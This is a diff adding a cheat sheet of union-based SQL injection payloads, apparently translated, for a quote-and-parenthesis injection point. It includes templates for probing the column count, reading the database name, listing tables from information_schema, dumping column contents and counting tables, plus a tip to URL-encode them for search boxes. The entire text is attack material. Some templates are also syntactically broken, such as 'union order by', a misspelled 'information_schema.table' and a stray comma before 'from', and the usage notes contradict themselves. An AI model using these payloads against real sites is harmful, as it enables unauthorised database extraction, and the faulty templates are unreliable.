@@ -1,0 +1,28 @@
+================================ XXX type is injected into ===================================
+1."xxx') union order by n1#":
+Directions of use:
+		This statement is used to determine the number of output rows on a page, and the page status return 200 indicates that the number of output rows is less than or equal to the number of output rows, and the other statement indicates that the number of output rows is greater than the number of output rows
+2."xxx') union select n1,database(),...#":
+Directions of use:
+		Use this statement to query the database name
+3。"xxx') union (select n1,table_name,..., from information_schema.tables where table_schema=database() limit table_index, table_nums)#",
+Directions of use:
+		Use this sentence to query the table name
+Parameter description:
+		n1: indicates the output of the first row
+		table_index: Indicates the index of the database table
+		table_nums: indicates the names of the output tables
+4."xxx') union (select n1,group_concat(table_name),..., from information_schema.table where table_schema=database())#",
+Directions of use:
+		The query table name is forcibly output to the same row
+5."xxx') union (select n1,elements,..., from table_name)#",
+Directions of use:
+		Use this sentence to show the fields you want to look up
+6."xxx') union (select n1,length(elements))#",
+Directions of use:
+		Use this sentence to query the length of the element name
+7."xxx') union  (select count(table_name) as table_sum from information_schema.tables where table_schema=database())#"
+Directions of use:
+		Use this sentence to query the number of tables in the database
+
+Note: If you want to enter it in the search box, you may need to transcode the URL
